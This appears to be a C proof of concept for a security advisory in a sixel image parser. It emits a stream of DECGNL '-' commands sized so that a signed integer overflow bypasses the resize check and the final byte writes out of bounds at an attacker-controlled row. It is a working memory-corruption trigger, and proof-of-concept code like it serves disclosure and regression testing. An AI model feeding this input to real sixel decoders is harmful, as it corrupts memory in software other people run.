/*
 * External-input PoC for GHSA-9jm7-77gr-qghv.
 *
 * The parser advances pos_y by six for each DECGNL '-' command without
 * resizing the image. INT_MAX - 1 is divisible by six, so the next sixel byte
 * evaluates pos_y + 6 as a signed int overflow while pos_y itself is still
 * non-negative. The vulnerable resize check is bypassed, and 'A' then writes
 * to image->data at a large attacker-controlled row offset.
 */

#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHUNK_SIZE 8192

int
main(void)
{
    char chunk[CHUNK_SIZE];
    int remaining;
    size_t n;

    memset(chunk, '-', sizeof(chunk));

    if (fputs("\033Pq", stdout) == EOF) {
        return EXIT_FAILURE;
    }

    remaining = (INT_MAX - 1) / 6;
    while (remaining > 0) {
        n = sizeof(chunk);
        if (remaining < (int)n) {
            n = (size_t)remaining;
        }
        if (fwrite(chunk, 1, n, stdout) != n) {
            return EXIT_FAILURE;
        }
        remaining -= (int)n;
    }

    if (fputs("A\033\\", stdout) == EOF) {
        return EXIT_FAILURE;
    }

    return ferror(stdout) ? EXIT_FAILURE : EXIT_SUCCESS;
}
